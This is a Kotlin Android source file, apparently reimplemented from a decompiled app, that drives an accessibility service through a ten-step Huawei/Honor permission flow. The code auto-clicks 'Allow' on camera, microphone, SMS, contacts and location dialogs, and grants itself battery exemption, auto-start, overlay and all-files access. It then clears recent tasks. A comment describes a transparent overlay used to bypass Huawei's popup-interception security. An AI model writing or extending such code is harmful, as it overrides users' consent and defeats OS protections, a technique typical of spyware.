package com.storm.safe.rock.service.modules.yw5xud

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Point
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.R
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import java.util.Locale
import kotlinx.coroutines.delay

/**
 * HuaweiSteps — Huawei/Honor (EMUI/HarmonyOS/MagicOS) configuration automation.
 * Matches vendor C0365a2 (a2, HuaweiSteps). Executes a 10-step orchestration
 * aligned with vendor executeAll (m212162a9, L1310-1622); see [execute] KDoc for the step list.
 *
 * Special sealed result types: HonorClickResult, LockVerifyResult, VerifyResult.
 *
 * Bug C (historical): earlier drafts referenced a non-existent component
 * `com.huawei.systemmanager/.optimize.process.ProtectActivity` — that was a fabrication;
 * vendor has no such Activity and no standalone "lock-screen cleanup" flow.
 * Removed in T16; the only launcher components we use are `STARTUP_COMPONENTS` (m212196f3)
 * and `BATTERY_COMPONENTS`.
 */
open class HuaweiSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    /**
     * Vendor C0365a2.f55064a2 — true when Build.BRAND lowercased == "honor".
     * Name chosen as `isHuawei` per task spec (class covers both Huawei and Honor branches).
     *
     * ADAPT: `open` so unit tests (e.g. [executeStep1BasicPermissions] tests) can override
     * via Mockito spies without having to mutate `Build.BRAND` in Robolectric.
     */
    open val isHuawei: Boolean = (Build.BRAND ?: "").lowercase(Locale.ROOT) == "honor"

    /**
     * Vendor C0365a2.f55062a0.getPackageName() — our application's packageName.
     * Cached here for keyword / pkg matching in the same 1:1 spirit as vendor.
     */
    val packageName: String = context.packageName

    /**
     * Vendor C0365a2.f55077b5 (appName) — application label, falls back to R.string.app_name.
     * Resolved eagerly (vendor uses lazy y90, but the difference is immaterial for tests).
     * ADAPT: vendor uses lazy `kotlin.Lazy`; we compute eagerly so `appLabel` is usable in tests.
     */
    val appLabel: String = resolveAppLabel(context)

    private fun resolveAppLabel(ctx: Context): String {
        // ADAPT: vendor catches only generic Exception via PackageManager.NameNotFoundException;
        // replica additionally catches Throwable to survive Mockito bare-mock Contexts (no PM stubbed)
        // and still produce a deterministic non-empty label.
        return try {
            val pm = ctx.packageManager ?: return ctx.packageName ?: "app"
            val info = pm.getApplicationInfo(ctx.packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Throwable) {
            try {
                ctx.getString(R.string.app_name)
            } catch (_: Throwable) {
                ctx.packageName ?: "app"
            }
        }
    }

    // --- Result sealed types (vendor inner classes C0365a2$VerifyResult /
    //     C0365a2$LockVerifyResult / C0365a2$HonorClickResult) ---

    /**
     * Vendor HuaweiSteps$VerifyResult enum (SUCCESS / STATE_NOT_CHANGED / NOT_FOUND).
     * ADAPT: modeled as Kotlin sealed class per task spec — `Fail` carries reason
     * (richer than vendor's bare enum); `NeedRetry` maps to vendor's STATE_NOT_CHANGED
     * (re-attempt path); `Pass` maps to SUCCESS. NOT_FOUND is absorbed into Fail("not_found")
     * by higher-level callers in T16.
     */
    sealed class VerifyResult {
        object Pass : VerifyResult()
        data class Fail(val reason: String) : VerifyResult()
        object NeedRetry : VerifyResult()
    }

    /**
     * Vendor HuaweiSteps$LockVerifyResult enum (LOCKED / NOT_LOCKED / UNKNOWN).
     * 1:1 mapped to sealed class objects.
     */
    sealed class LockVerifyResult {
        object Locked : LockVerifyResult()
        object Unlocked : LockVerifyResult()
        object Unknown : LockVerifyResult()
    }

    /**
     * Vendor HuaweiSteps$HonorClickResult enum (CLICKED / NO_DIALOG / FAILED).
     * ADAPT: `Clicked` carries matched keyword (richer diagnostics); `NotFound` covers both
     * NO_DIALOG and FAILED (merged per task spec — T16 may split if vendor logic demands).
     */
    sealed class HonorClickResult {
        data class Clicked(val keyword: String) : HonorClickResult()
        object NotFound : HonorClickResult()
    }

    companion object {
        private const val TAG = "HuaweiSteps"

        /**
         * Startup manager components (4-level fallback per vendor C0365a2.m212196f3 L6862).
         * ADAPT: vendor uses `StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo")`
         * which decrypts to "com.huawei.systemmanager"; replica hardcodes the plaintext
         * (same value, no runtime obfuscation overhead).
         */
        val STARTUP_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"),
            ComponentName("com.hihonor.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"),
            ComponentName("com.hihonor.systemmanager", "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwPowerManagerActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwBatterySettings")
        )

        /** Keywords for finding auto-manage switch. */
        val AUTO_MANAGE_KEYWORDS = listOf("自动管理", "自动运行", "Auto-manage", "Auto manage")

        /** Keywords for startup allow options. */
        val STARTUP_ALLOW_KEYWORDS = listOf(
            "允许自启动", "允许关联启动", "允许后台活动",
            "Allow auto-launch", "Allow associated startup", "Allow background activity"
        )

        /** Keywords for "不优化" in battery settings. */
        val DONT_OPTIMIZE_KEYWORDS = listOf("不优化", "Don't optimize", "Not optimized", "无限制")

        /**
         * Vendor m212172b9 L4813 — search-box viewId array for overlay permission page.
         * Three variants covering AOSP, com.android.settings, and com.hihonor.settings packages.
         */
        val OVERLAY_SEARCH_BOX_IDS: List<String> = listOf(
            "android:id/search_src_text",
            "com.android.settings:id/search_src_text",
            "com.hihonor.settings:id/search_src_text"
        )

        /**
         * Vendor m212167b4 L2781 — resource-id list for "clear all recents" button.
         * 15 variants covering com.huawei, com.hihonor, and com.android.systemui packages.
         * Ordered by vendor: Huawei-launcher ids first, then Honor-launcher, then AOSP systemui.
         */
        val CLEAR_ALL_RECENTS_VIEW_IDS: List<String> = listOf(
            "com.huawei.android.launcher:id/clear_all_recents_image_button",
            "com.huawei.android.launcher:id/clearbox",
            "com.huawei.android.launcher:id/clear_all_btn",
            "com.huawei.android.launcher:id/clear_all",
            "com.huawei.android.launcher:id/clearAnimView",
            "com.huawei.android.launcher:id/clear_button",
            "com.huawei.android.launcher:id/dismiss_task",
            "com.hihonor.android.launcher:id/clear_all_recents_image_button",
            "com.hihonor.android.launcher:id/clearbox",
            "com.hihonor.android.launcher:id/clear_all_btn",
            "com.hihonor.android.launcher:id/clear_all",
            "com.hihonor.android.launcher:id/clearAnimView",
            "com.hihonor.android.launcher:id/clear_button",
            "com.android.systemui:id/clear_all",
            "com.android.systemui:id/dismiss_all"
        )

        /**
         * Vendor m212167b4 L2806 — contentDescription list for "close all" action.
         * 5 variants per vendor source.
         */
        val CLEAR_ALL_CONTENT_DESCS: List<String> = listOf(
            "关闭所有最近打开的应用",
            "关闭全部",
            "关闭所有",
            "清除全部",
            "清空"
        )

        /**
         * Vendor m212167b4 L2825 — text-match list for "clear all" button (Simplified + Traditional Chinese).
         * 18 strings per vendor source (includes Traditional Chinese variants for multi-lang support).
         */
        val CLEAR_ALL_TEXT_KEYWORDS: List<String> = listOf(
            "清空", "一键清理", "全部清理", "清除全部", "清除", "清理全部", "清理",
            "关闭全部", "关闭所有",
            // Traditional Chinese variants (vendor L2825 second block)
            "清空", "一鍵清理", "全部清理", "清除全部", "清除", "清理全部", "清理",
            "關閉全部", "關閉所有"
        )

        /**
         * Vendor m212209g7 L7808 — keywords used to verify recents screen is open.
         * Match against findAccessibilityNodeInfosByText to check for clear-related items.
         */
        val RECENTS_VERIFY_KEYWORDS: List<String> = listOf("清空", "一键清理", "全部清理", "清除", "清理", "关闭全部")

        /**
         * Vendor m212209g7 L7981 — text keywords indicating app is "locked" in recents.
         * If any of these are found visible, app card is already locked.
         */
        val LOCK_INDICATOR_TEXTS: List<String> = listOf(
            "解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제", "Entsperren", "Déverrouiller"
        )

        /**
         * Vendor m212209g7 L8028 — viewIds for lock icon indicating app is pinned.
         */
        val LOCK_ICON_VIEW_IDS: List<String> = listOf(
            "com.huawei.android.launcher:id/lock_icon",
            "com.huawei.android.launcher:id/iv_lock",
            "com.huawei.android.launcher:id/task_lock",
            "com.hihonor.android.launcher:id/lock_icon",
            "com.hihonor.android.launcher:id/iv_lock"
        )

        /**
         * Vendor m212172b9 L4940 strArr2 — switch-text options for enabling overlay permission.
         * Tried in sequence; first match clicked. All 6 strings per vendor source.
         */
        val OVERLAY_SWITCH_TEXTS: List<String> = listOf(
            "显示在其他应用的上层",
            "在其他应用上层显示",
            "显示在其他应用上层",
            "允许显示在其他应用的上层",
            "悬浮窗",
            "显示悬浮窗"
        )

        /**
         * Vendor m212155e9 (L759-769) — boolean: does this window title indicate a runtime
         * permission dialog on Honor/MagicOS?
         *
         * Vendor checks 23 keywords using substring match (AbstractC0779a1.m213652a5 with
         * ignoreCase=false). Replica uses [String.contains] with the same semantics.
         *
         * Keyword list (vendor L761, index 0-22):
         *  0: "是否允许", 1: "允许", 2: "权限", 3: "拍摄照片", 4: "录制视频",
         *  5: "访问", 6: "拍摄", 7: "录制", 8: "麦克风", 9: "位置",
         *  10: "存储", 11: "相册", 12: "通讯录", 13: "短信", 14: "SMS",
         *  15: "电话", 16: "Phone", 17: "日历", 18: "Calendar", 19: "传感器",
         *  20: "Sensors", 21: "蓝牙", 22: "Bluetooth"
         */
        fun isHonorPermissionTitle(title: String): Boolean {
            if (title.isEmpty()) return false
            val keywords = arrayOf(
                "是否允许", "允许", "权限", "拍摄照片", "录制视频",
                "访问", "拍摄", "录制", "麦克风", "位置",
                "存储", "相册", "通讯录", "短信", "SMS",
                "电话", "Phone", "日历", "Calendar", "传感器",
                "Sensors", "蓝牙", "Bluetooth"
            )
            for (kw in keywords) {
                if (title.contains(kw)) return true
            }
            return false
        }

        /**
         * Vendor m212152d3 (L720-722) — map window title → [HonorPercentConfig].
         *
         * Returns primary (x1,y1) and alternate (x2,y2) click coordinates as fractions of
         * screen width/height, plus a human-readable description label.
         *
         * All 12 branches + default ported verbatim from vendor one-liner L721.
         *
         * ADAPT: vendor returns `j40` (anonymous obfuscated class); replica uses named
         * [HonorPercentConfig] data class with same field order (x1, y1, x2, y2, description).
         */
        fun getHonorPercentConfig(title: String): HonorPercentConfig {
            // Vendor: AbstractC0779a1.m213652a5(str, keyword, false) = str.contains(keyword)
            return when {
                title.contains("拍摄") || title.contains("相机") ||
                    title.contains("录制视频") || title.contains("Camera") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "📷相机")

                title.contains("照片") || title.contains("图片") ||
                    title.contains("视频") || title.contains("相册") || title.contains("媒体") ||
                    title.contains("Photo") || title.contains("Video") || title.contains("Media") ->
                    HonorPercentConfig(0.65f, 0.845f, 0.65f, 0.815f, "🖼️相册")

                title.contains("录制音频") || title.contains("录音") ||
                    title.contains("麦克风") || title.contains("音频") ||
                    title.contains("Microphone") || title.contains("Record audio") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "🎤麦克风")

                title.contains("短信") || title.contains("信息") ||
                    title.contains("SMS") || title.contains("Message") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "📱短信")

                title.contains("电话") || title.contains("通话") ||
                    title.contains("拨打") || title.contains("Phone") || title.contains("Call") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "📞电话")

                title.contains("通讯录") || title.contains("联系人") ||
                    title.contains("Contacts") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "👥通讯录")

                title.contains("位置") || title.contains("定位") ||
                    title.contains("Location") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "📍位置")

                title.contains("存储") || title.contains("文件") ||
                    title.contains("Storage") || title.contains("File") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "📁存储")

                title.contains("日历") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "📅日历")

                title.contains("通知") || title.contains("Notification") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "🔔通知")

                title.contains("设备") || title.contains("IMEI") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "📲设备")

                else ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "🔧默认")
            }
        }

        /**
         * Step 6 悬浮窗列表页坐标 fallback（对齐 vendor L5800-5850）。
         * 按屏幕宽度 3 档返回点击坐标。
         *
         * vendor 行为：列表页找不到目标应用时，盲点该坐标，赌应用恰好位于默认位置。
         * ADAPT: 保留为列表页最后兜底，优先走搜索框 + 文本精确匹配。
         */
        fun getOverlayListFallbackPoint(widthPx: Int, heightPx: Int): Pair<Float, Float> {
            val (wPct, hPct) = when {
                widthPx <= 720 -> 0.85f to 0.25f
                widthPx <= 1080 -> 0.88f to 0.26f
                else -> 0.90f to 0.27f
            }
            return (widthPx * wPct) to (heightPx * hPct)
        }

        /**
         * Vendor mode-2 keyword array (L1040) — order is verbatim from vendor source.
         * Used in [detectAndClickHonorPermissionDialog] 模式2 loop.
         *
         * Vendor array (10 entries, L1040):
         *  "允许", "始终允许", "仅在使用中允许", "确定", "同意",
         *  "Allow", "Allow always", "While using the app", "OK", "Agree"
         *
         * NOTE: vendor array ORDER above is the L1040 literal order. However the plan
         * specifies priority "始终允许" > "仅在使用中允许" > "允许". Looking at vendor more
         * carefully, mode-2 iterates all 10 in order and tries every matching node — the
         * first successful performAction wins. We keep vendor array order faithfully.
         *
         * ADAPT: The plan describes a SEPARATE priority list for the high-level approach
         * (始终允许 > 仅在使用中允许 > 允许). The mode-2 array is the fallback list after
         * coord-tap and switch-click both fail. Vendor order L1040 is used as-is.
         */
        val MODE2_KEYWORDS: Array<String> = arrayOf(
            "允许", "始终允许", "仅在使用中允许", "确定", "同意",
            "Allow", "Allow always", "While using the app", "OK", "Agree"
        )
    }

    /**
     * Coordinate-click configuration for Honor permission dialogs.
     *
     * Vendor equivalent: `p000.j40` (HonorPercentConfig). Named fields replace
     * anonymous obfuscated field names f57260a0 ~ f57264a4.
     *
     * @param x1          Primary click X fraction of screen width  (vendor f57260a0)
     * @param y1          Primary click Y fraction of screen height (vendor f57261a1)
     * @param x2          Alternate click X fraction of screen width  (vendor f57262a2)
     * @param y2          Alternate click Y fraction of screen height (vendor f57263a3)
     * @param description Human-readable label for logging         (vendor f57264a4)
     */
    data class HonorPercentConfig(
        val x1: Float,
        val y1: Float,
        val x2: Float,
        val y2: Float,
        val description: String
    )

    /** Result types matching vendor inner classes */
    sealed class StepResult {
        data class Success(val message: String) : StepResult()
        data class Failure(val message: String) : StepResult()
        data class NeedVerify(val message: String) : StepResult()
    }

    /**
     * Vendor C0365a2 m212162a9 (L1310-1578) — executeAll 主编排。
     *
     * Vendor flow (from coroutine state-machine decompile):
     *  - case 0 guard (L1329-1336): Settings.System.canWrite(context)==true → log + return TRUE
     *  - [1/10] (L1338-1346): if !f55064a2 (non-Honor) → executeStep1BasicPermissions
     *  - PermissionGranter stop (L1348-1358): try { stop auto-click service } catch {}
     *  - [2/10] (L1359): executeStep2BatteryWhitelist + delay(100L)
     *  - [3/10] (L1366): executeStep3BatterySettings + delay(100L)
     *  - [4/10] (L1373-1381): if f55064a2 (Honor) → executeStep4NotificationListener
     *  - delay(100L) (L1384)
     *  - [5/10] (L1385): executeStep5AutoStart + delay(100L)
     *  - [6/10] (L1392): executeStep6OverlayPermission + delay(100L)
     *  - [7/10] (L1399): executeStep7NotificationPermission + delay(100L)
     *  - [8/10] (L1406): executeStep8AllFilesAccess + delay(100L)
     *  - [9/10] (L1413): executeStep9ClearRecentTasks
     *  - case 17 (L1570-1575): log "华为授权完成", return TRUE
     *
     * ADAPT:
     *  - `Settings.System.canWrite` extracted as open `canWriteSettings()` for test spying.
     *  - PermissionGranter stop (f52369a0.m211329h2) requires casting service to `dqtvuisjd`
     *    which is the AccessibilityService subclass; replica cannot directly access this field.
     *    We log the intent but skip the actual call. (ADAPT: structural gap — no PermissionGranter
     *    instance accessible from HuaweiSteps.)
     *  - delay(100L) between steps aligns to vendor b81.m210571b1(100L) calls.
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "╔══════════ executeAll 开始 ══════════")
        android.util.Log.i("HuaweiSteps", "║ isHuawei(Honor flag)=$isHuawei, pkg=$packageName, label=$appLabel")
        android.util.Log.i("HuaweiSteps", "║ Build.BRAND=${android.os.Build.BRAND}, Build.MODEL=${android.os.Build.MODEL}")

        // Vendor case 0, L1329-1336: Settings.System.canWrite guard
        if (canWriteSettings()) {
            android.util.Log.i("HuaweiSteps", "║ Settings.System.canWrite=true → 跳过整个适配流程")
            logs.add("║ HuaweiSteps 跳过 — 已有 canWrite 系统设置权限")
            successes.add("HuaweiSteps: 已完成 — Settings.System.canWrite=true，跳过适配流程")
            return
        }

        // ADAPT: real-device hardening — 创建 TYPE_ACCESSIBILITY_OVERLAY (1x1 透明 window)
        // 让 callingUidHasAnyVisibleWindow=true，绕过华为 HPS (PopupActivityEventMonitor)
        // 的 hwInterceptionMask=6160 弹窗拦截。vendor 用 overlay/C0353a0.java (type=2032)。
        // AccessibilityService 天然有权创建此类型 window，不需要 SYSTEM_ALERT_WINDOW。
        HuaweiOverlayHelper.show(service)
        android.util.Log.i("HuaweiSteps", "║ HuaweiOverlayHelper.show → isShowing=${HuaweiOverlayHelper.isShowing()}")
        // 等 overlay 在主线程 addView 完成（Handler.post 是异步的）
        kotlinx.coroutines.delay(200L)

        // ADAPT: vendor-alignment P2 — 折叠屏激活左侧面板焦点
        // 对齐 vendor C0365a2.java L378-383：折叠屏主屏宽比 ≥ 0.6 或机型含 "fold"/"mate x" 等
        // 关键字时，手势点击 (0.4w, 0.5h) 激活左侧面板，否则设置主页可能只在右侧面板，
        // 导致后续 "应用和服务" BFS 导航找不到目标节点。
        if (FoldableDeviceDetector.isFoldable(context)) {
            val activated = FoldableDeviceDetector.activateLeftPanel(service)
            HuaweiStepLogger.probe(0, "folded-device-activated", "activated=$activated")
            logs.add("║ 折叠屏检测：激活左侧面板 activated=$activated")
            delay(500L) // 等手势完成 + 左侧面板获得焦点
        }

        HuaweiStepLogger.phase(1, "基础权限 (vendor L1337)", detail = "仅非荣耀执行", logs = logs)
        if (!isHuawei) {
            executeStep1BasicPermissions(successes, failures, logs)
        } else {
            HuaweiStepLogger.skip(1, "荣耀设备跳过基础权限 (vendor L1338)", logs)
        }

        // Vendor L1348-1358: stop PermissionGranter auto-click service
        HuaweiStepLogger.probe(1, "stop-permission-granter", "ADAPT: dqtvuisjd not accessible")

        // ADAPT: real-device hardening — vendor 每步间 delay(100L)，华为 HarmonyOS 4.2 真机
        // 页面渲染慢，100ms 导致竞争（上一页还在渲染下一步已 startActivity 新页面）。
        // 改为 1500ms 保证页面稳定。
        val stepDelay = 1500L

        HuaweiStepLogger.phase(2, "电池优化白名单 (vendor L1359)", logs = logs)
        executeStep2BatteryWhitelist(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(3, "电池设置 (vendor L1366)", logs = logs)
        executeStep3BatterySettings(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(4, "通知使用权 (vendor L1373)", detail = "仅荣耀执行", logs = logs)
        if (isHuawei) {
            executeStep4NotificationListener(successes, failures, logs)
        } else {
            HuaweiStepLogger.skip(4, "非荣耀设备跳过通知使用权 (vendor L1380)", logs)
        }
        delay(stepDelay)

        HuaweiStepLogger.phase(5, "自启动权限 (vendor L1385)", logs = logs)
        executeStep5AutoStart(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(6, "悬浮窗权限 (vendor L1392)", logs = logs)
        executeStep6OverlayPermission(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(7, "通知权限 (vendor L1399)", logs = logs)
        executeStep7NotificationPermission(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(8, "所有文件访问权限 (vendor L1406)", logs = logs)
        executeStep8AllFilesAccess(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(9, "清除最近任务 (vendor L1413)", logs = logs)
        executeStep9ClearRecentTasks(successes, failures, logs)

        // ADAPT: 移除 overlay + 回到 app 前台
        HuaweiOverlayHelper.remove(service)
        android.util.Log.i("HuaweiSteps", "║ HuaweiOverlayHelper.remove → overlay 已移除")

        // ADAPT: real-device hardening — executeAll 结束后显式回到 app 前台
        // 避免停在 Settings 页或桌面（vendor 由 dqtvuisjd postAuth 处理，replica 无法访问）
        try {
            val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP)
                service?.startActivity(launchIntent) ?: context.startActivity(launchIntent)
                android.util.Log.i("HuaweiSteps", "║ 已 startActivity 回到 app 前台")
            }
        } catch (e: Exception) {
            android.util.Log.w("HuaweiSteps", "║ 回到 app 前台失败: ${e.message}")
        }

        android.util.Log.i("HuaweiSteps", "╚══════════ executeAll 完成 ══════════")
        android.util.Log.i("HuaweiSteps", "║ success=${successes.size} failure=${failures.size}")
        successes.add("HuaweiSteps: 华为/荣耀权限配置完成")

        // ADAPT: 真机加固 — Pged-Freezer 可能在 Step 9 清除任务时杀进程导致上层
        // markAuthCompleted 永不执行。提前 checkpoint，executeAll 核心流程完成即持久化。
        try {
            DeviceAuthorizationManager.markAuthCompleted(context)
            android.util.Log.i("HuaweiSteps", "║ ✅ markAuthCompleted (executeAll 末尾 checkpoint)")
        } catch (e: Exception) {
            android.util.Log.w("HuaweiSteps", "║ ⚠️ markAuthCompleted 失败: ${e.message}")
        }
    }

    /**
     * Vendor L1329: Settings.System.canWrite(this.f55062a0) gate.
     *
     * Extracted as open method so tests can override without having to stub
     * android.provider.Settings.System (not easily stubbed in Robolectric unit tests).
     *
     * ADAPT: vendor calls this inline in the coroutine SM case 0; replica extracts to allow
     *        test isolation via subclass override.
     */
    open fun canWriteSettings(): Boolean {
        return try {
            Settings.System.canWrite(context)
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Vendor C0365a2 m212169b6 (L3524-3724) — 华为基础权限（仅通知权限弹窗）。
     *
     * Vendor semantics (from JADX decompile):
     *  - L3551: log "[华为基础权限] 开始（超时10秒）"
     *  - L3554: `m212183d7(...)` — pre-check: if a notification permission dialog is already
     *           popped up, click 始终允许 then fallback 允许, delay 300ms. (vendor L6405-6418)
     *  - L3674: `m212194f1()` — "[权限] 启动权限请求Activity..." — posts a runnable on main
     *           thread that requests the notification permission and waits 3s.
     *  - L3646-3669: main loop — `while (now - start < 10_000 && m212187e1())` (notification
     *           dialog visible) → clickText("始终允许", true) || clickText("允许", true) →
     *           delay(300ms). Tail completion log: "[华为基础权限] 完成，用时Xs, 点击 N 次".
     *
     * Vendor L1338 gate: Step 1 only runs when `f55064a2 == false` (BRAND != "honor"). In
     * replica, [isHuawei] is that same Honor flag (true ⇒ Honor) — semantics are inverted
     * vs. the naive reading of the name; we therefore skip when `isHuawei == true`.
     *
     * ADAPT:
     *  - We do NOT attempt to port `m212194f1()` (permission request Activity launch) here:
     *    the request is already initiated by the caller flow (MainOrchestrator /
     *    Yw5xudHandler). An inline `// TODO: VENDOR_VERIFY` marker is kept at the call-site
     *    so T19 真机验证 can revisit if the pre-dialog never auto-appears.
     *  - We bound total clicks to avoid a pathological tight loop if the dialog is always
     *    present but clicks silently fail. Vendor appears to rely on the 10s timeout alone;
     *    our safety guard is documented inline.
     */
    @Suppress("UNUSED_PARAMETER") // `failures` kept for signature parity with other step fns
    open suspend fun executeStep1BasicPermissions(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step1/10] enter executeStep1BasicPermissions (isHuawei=$isHuawei)")
        if (isHuawei) {
            HuaweiStepLogger.skip(1, "荣耀跳过 (vendor L1338 f55064a2=true)", logs)
            return
        }
        HuaweiStepLogger.phase(1, "基础权限开始（超时10秒）", "vendor L3551", logs)

        val detector = HuaweiPageDetector()
        val timeoutMs = 10_000L // vendor L3564 `j = 10000`
        val start = System.currentTimeMillis()
        var clickCount = 0

        // ADAPT: vendor-alignment P2 — 对齐 vendor L3674 m212194f1()
        // 独立 Activity 形式触发 POST_NOTIFICATIONS runtime 权限请求，
        // 让后续 10s 轮询循环能检测到"允许"按钮并点击。
        // vendor 用主线程 post Runnable；replica 改为 service.startActivity(Activity).
        try {
            val svc = service
            if (svc != null) {
                svc.startActivity(HuaweiPermissionRequestActivity.launchIntent(context))
                HuaweiStepLogger.probe(1, "launch-perm-req-activity", "started HuaweiPermissionRequestActivity")
                logs.add("║ [Step1/10] 已启动 HuaweiPermissionRequestActivity")
                kotlinx.coroutines.delay(800L)
            } else {
                HuaweiStepLogger.probe(1, "launch-perm-req-activity", "service=null,跳过")
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w("HuaweiSteps", "[Step1/10] launch HuaweiPermissionRequestActivity 失败: ${e.message}")
        }

        // Vendor L3554 pre-check (m212183d7): if dialog already present, click once, delay 300ms.
        run {
            val root = service?.rootInActiveWindow
            if (root != null && detector.isNotificationPermissionDialog(root)) {
                logs.add("[Step1/10] [华为权限] 检测到提前弹出的通知权限弹窗, 点击允许/始终允许 (vendor L6408)")
                if (!clickTextOnCurrentRoot("始终允许", exact = true)) {
                    clickTextOnCurrentRoot("允许", exact = true)
                }
                clickCount++
                delay(300L) // vendor L6412 `b81.m210571b1(300L, ...)`
            }
        }

        // Vendor L3646-3669 main loop.
        val maxClicksGuard = 40 // ADAPT: safety cap (~ 40 * 300ms = 12s clamp). Vendor has none.
        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = service?.rootInActiveWindow
            if (root == null) {
                delay(300L) // idle tick — wait for service/root
                continue
            }

            // ADAPT: 真机验证 (2026-04-17 FIN-AL60 Android 12 dump) — resource-id 驱动替代 coord.
            // 华为 Android 12 GrantPermissionsActivity 根据权限类型切换 2 / 3 按钮布局：
            //   3 按钮（CAMERA/LOCATION/MIC）：permission_allow_foreground_only_button @ (542,1992)
            //   2 按钮（其他）:                  permission_allow_button                 @ (777,2261)
            // 坐标因布局浮动达 135+ 像素，vendor 硬编码 coord 表必然覆盖不全。
            // uiautomator dump 证明 AccessibilityService 可读到所有 *_allow_button resource-id。
            val clickedViaId = clickPermissionControllerAllowButton()
            if (clickedViaId != null) {
                HuaweiStepLogger.probe(1, "allow-by-id", clickedViaId)
                logs.add("[Step1/10] 通过 resource-id '$clickedViaId' 点击允许")
                clickCount++
                delay(300L) // vendor L3664
                if (clickCount >= maxClicksGuard) break
                continue
            }

            // 非 permissioncontroller 布局（华为自定义通知权限弹窗等）— 走 vendor 原始文本路径
            val dialogTitle = detector.detectPermissionDialogTitle(root)
                ?: if (detector.isNotificationPermissionDialog(root)) "通知" else null
            if (dialogTitle == null) {
                break  // vendor L3647 — dialog not visible
            }

            logs.add("[Step1/10] [华为权限] 检测到 '$dialogTitle' 权限弹窗 (vendor L3653)")
            // vendor L3654-3656 文本点击（"始终允许" / "允许" / "仅使用期间允许"）
            val textClicked = clickTextOnCurrentRoot("始终允许", exact = true) ||
                clickTextOnCurrentRoot("允许", exact = true) ||
                clickTextOnCurrentRoot("仅使用期间允许", exact = true)
            if (textClicked) {
                clickCount++
                delay(300L) // vendor L3664
            } else {
                // 既无 permissioncontroller resource-id 也无可点文本 — 等下一轮
                HuaweiStepLogger.probe(1, "no-clickable-button", "dialogTitle=$dialogTitle")
                delay(500L)
            }
            if (clickCount >= maxClicksGuard) break
        }

        val elapsedSec = (System.currentTimeMillis() - start) / 1000L
        // Vendor L3669 completion log — keep shape verbatim so grep of real device logs matches.
        logs.add("[Step1/10] [华为基础权限] 完成，用时${elapsedSec}秒，点击 $clickCount 次")
        if (clickCount > 0) {
            successes.add("[Step1/10] 华为基础权限已处理 $clickCount 次允许点击")
        }
        // Vendor does not surface a failure here — a no-click outcome simply means the dialog
        // never appeared (permission already granted). Do NOT add to `failures`.
    }

    /**
     * Vendor C0365a2 m212166b3 (L2512-2740) — 华为/通用 电池优化白名单 (Step 2/10).
     *
     * Vendor semantics (distilled from the decompile):
     *  - L2544 log: "[电池白名单] 检查是否已忽略电池优化"
     *  - L2545-2548 SharedPreferences 短路 (m212193f0 "battery_whitelist_completed") —
     *    **NOT** replicated here; SP 持久化由 T16 统一实现（见下方 ADAPT 注释）
     *  - L2551-2557 PowerManager.isIgnoringBatteryOptimizations 快路径：命中则 f2 标记并 return
     *  - L2561-2565 构造 `Intent(ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)` + `setData("package:pkg")`
     *    + `setFlags(276824064)` + `service.startActivity(intent)`
     *  - L2568 `delay(300L)` 等弹窗
     *  - L2581-2608 最多 6 次 100ms 轮询 `rootInActiveWindow` 收集文本，匹配
     *    "忽略/电池/优化/Ignore/Battery/Optimize" 任一字串 → break 出探测循环
     *  - L2610-2612 若循环结束仍未发现文本 → log "弹窗未出现，可能已经在白名单中"
     *  - L2616/2726 批准关键词 14 项：
     *    `["忽略","关闭","不优化","允许","确定","不再提醒","知道了",
